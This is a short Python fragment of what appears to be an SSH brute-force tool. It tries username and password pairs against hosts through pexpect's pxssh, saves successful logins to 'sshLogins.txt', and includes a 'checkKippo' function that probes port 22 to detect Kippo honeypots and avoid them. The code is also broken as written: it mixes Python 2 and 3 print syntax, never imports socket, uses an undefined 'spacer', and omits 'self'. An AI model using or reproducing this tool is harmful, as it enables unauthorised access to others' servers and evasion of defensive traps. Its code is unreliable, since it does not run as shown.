from pexpect import pxssh
s = pxssh.pxssh()

class ssh:
	def connect(ip, user, upass):
		print ("[*] Trying to login with " + user + ":" + upass + " on " + ip)
		if not s.login (ip, user, upass):
			print ("[-] Failed : "+ip+":"+user+":"+upass)
			print str(s)
		else:
			print ("[+] Success : "+ip+":"+user+":"+upass)
			with open("sshLogins.txt", "a") as myfile:
				myfile.write(ip+":"+user+":"+upass + '\n')
			s.logout()

	def checkKippo(ip):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, 22))
			banner = s.recv(1024)
			s.send(banner + spacer)
			response = s.recv(1024)
			if (b'Protocol mismatch' in response or b'bad packet length' in response):
				return 0
			else:
				return 1
		except Exception:
			pass
